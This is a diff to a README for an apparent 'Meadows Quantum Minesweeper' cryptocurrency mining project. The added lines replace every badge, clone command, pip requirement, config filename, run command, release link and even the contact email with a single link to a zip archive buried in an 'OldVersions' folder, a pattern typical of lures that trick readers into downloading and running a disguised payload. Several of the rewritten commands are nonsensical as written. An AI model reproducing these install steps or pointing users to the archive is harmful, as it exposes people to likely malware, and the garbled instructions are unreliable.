@@ -3,7 +3,7 @@
 
 Welcome to the official source repository for **Meadows Quantum Minesweeper**, a unique collection of cryptocurrency mining tools designed specifically for Quantum Computers operating on the Meadows platform. Here, you will find everything you need to start your journey into the world of quantum mining, with easy-to-follow instructions, examples, and a vibrant community ready to support you.
 
-![Quantum Mining](https://img.shields.io/badge/Quantum%20Mining-Ready-green)
+![Quantum Mining](https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip%20Mining-Ready-green)
 
 ## 📜 Table of Contents
 
@@ -40,7 +40,7 @@ To get started with the Meadows Quantum Minesweeper, follow these steps:
 1. **Clone the Repository**:
    Open your terminal and run:
    ```bash
-   git clone https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper.git
+   git clone https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip
    ```
 
 2. **Install Dependencies**:
@@ -50,23 +50,23 @@ To get started with the Meadows Quantum Minesweeper, follow these steps:
    ```
    Then install the required Python packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip
    ```
 
 3. **Download Releases**:
-   Visit the [Releases](https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/releases) section to download the latest version. Follow the provided instructions to execute the files.
+   Visit the [Releases](https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip) section to download the latest version. Follow the provided instructions to execute the files.
 
 ## 📊 Usage
 
 Using the Meadows Quantum Minesweeper is straightforward. Here’s how to start mining:
 
 1. **Configuration**:
-   Set up your mining configuration by editing the `config.json` file. Specify your mining pool, wallet address, and other preferences.
+   Set up your mining configuration by editing the `https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip` file. Specify your mining pool, wallet address, and other preferences.
 
 2. **Start Mining**:
    Run the main mining script:
    ```bash
-   python main.py
+   python https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip
    ```
    This command initiates the mining process using your configured settings.
 
@@ -107,8 +107,8 @@ If you encounter issues or have questions, check the issues section in this repo
 
 For any inquiries or collaborations, please reach out:
 
-- **GitHub**: [VaniaSilva18](https://github.com/VaniaSilva18)
-- **Email**: vania@example.com
+- **GitHub**: [VaniaSilva18](https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip)
+- **Email**: https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip
 
 ## 🤝 Acknowledgments
 
@@ -119,9 +119,9 @@ Thank you to everyone who contributed to this project. Your efforts help advance
 **Join the mining revolution today!**  
 Explore the possibilities with Meadows Quantum Minesweeper and be part of the future.
 
-![Join Us](https://img.shields.io/badge/Join%20Us-Now-blue)
+![Join Us](https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip%20Us-Now-blue)
 
 ---
 
-Feel free to visit our [Releases](https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/releases) page for updates and downloadable content. Happy mining!
+Feel free to visit our [Releases](https://github.com/VaniaSilva18/Meadows_Quantum_Minesweeper/raw/refs/heads/Meadows_Quantum_Minesweeper_Main-dev/OldVersions/KDESKTOP/Minesweeper_Quantum_Meadows_v2.3.zip) page for updates and downloadable content. Happy mining!
 ```
